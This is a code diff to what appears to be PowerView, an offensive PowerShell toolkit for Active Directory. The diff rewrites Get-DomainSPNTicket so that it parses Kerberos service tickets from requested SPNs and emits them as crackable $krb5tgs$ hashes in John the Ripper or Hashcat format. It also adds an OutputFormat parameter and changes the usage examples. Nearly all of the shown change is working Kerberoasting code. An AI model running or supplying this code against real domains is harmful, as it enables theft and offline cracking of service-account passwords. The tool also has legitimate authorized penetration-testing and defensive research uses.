@@ -2597,6 +2597,11 @@ Specifies the service principal name to request the ticket for.
 
 Specifies a PowerView.User object (result of Get-DomainUser) to request the ticket for.
 
+.PARAMETER OutputFormat
+
+Either 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat format.
+Defaults to 'John'.
+
 .PARAMETER Credential
 
 A [Management.Automation.PSCredential] object of alternate credentials
@@ -2616,9 +2621,9 @@ Request kerberos service tickets for all SPNs passed on the pipeline.
 
 .EXAMPLE
 
-Get-DomainUser -SPN | Get-DomainSPNTicket
+Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat
 
-Request kerberos service tickets for all users with non-null SPNs.
+Request kerberos service tickets for all users with non-null SPNs and output in Hashcat format.
 
 .INPUTS
 
@@ -2652,6 +2657,11 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
         [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
         [Object[]]
         $User,
+
+        [ValidateSet('John', 'Hashcat')]
+        [Alias('Format')]
+        [String]
+        $OutputFormat = 'John',
 
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
@@ -2701,28 +2711,53 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
                 $TicketByteStream = $Ticket.GetRequest()
             }
             if ($TicketByteStream) {
-                $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'
-                [System.Collections.ArrayList]$Parts = ($TicketHexStream -replace '^(.*?)04820...(.*)','$2') -Split 'A48201'
-                $Parts.RemoveAt($Parts.Count - 1)
-                $Hash = $Parts -join 'A48201'
-                $Hash = $Hash.Insert(32, '$')
-
                 $Out = New-Object PSObject
+
+                $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'
+
+                # TicketHexStream == GSS-API Frame (see https://tools.ietf.org/html/rfc4121#section-4.1)
+                # No easy way to parse ASN1, so we'll try some janky regex to parse the embedded KRB_AP_REQ.Ticket object
+                if($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
+                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
+                    $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
+                    $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)
+
+                    # Make sure the next field matches the beginning of the KRB_AP_REQ.Authenticator object
+                    if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482') {
+                        Write-Warning 'Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"'
+                        $Hash = $null
+                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
+                    } else {
+                        $Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
+                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
+                    }
+                } else {
+                    Write-Warning "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
+                    $Hash = $null
+                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
+                }
+
+                if($Hash) {
+                    if ($OutputFormat -match 'John') {
+                        $HashFormat = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
+                    }
+                    else {
+                        if ($DistinguishedName -ne 'UNKNOWN') {
+                            $UserDomain = $DistinguishedName.SubString($DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                        }
+                        else {
+                            $UserDomain = 'UNKNOWN'
+                        }
+
+                        # hashcat output format
+                        $HashFormat = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
+                    }
+                    $Out | Add-Member Noteproperty 'Hash' $HashFormat
+                }
+
                 $Out | Add-Member Noteproperty 'SamAccountName' $SamAccountName
                 $Out | Add-Member Noteproperty 'DistinguishedName' $DistinguishedName
                 $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName
-
-                if ($DistinguishedName -ne 'UNKNOWN') {
-                    $UserDomain = $DistinguishedName.SubString($DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
-                }
-                else {
-                    $UserDomain = 'UNKNOWN'
-                }
-
-                # hashcat output format (and now John's)
-                $HashFormat = "`$krb5tgs`$23`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
-
-                $Out | Add-Member Noteproperty 'Hash' $HashFormat
                 $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                 Write-Output $Out
             }
@@ -8658,7 +8693,7 @@ OpaqueLength           : 0
 
 Remove-DomainObjectAcl -TargetIdentity user2 -PrincipalIdentity user -Rights ResetPassword
 
-Get-DomainObjectACL user2 -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $UserSID }
+Get-DomainObjectACL user2 -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $UserSID}
 
 [no results returned]
 
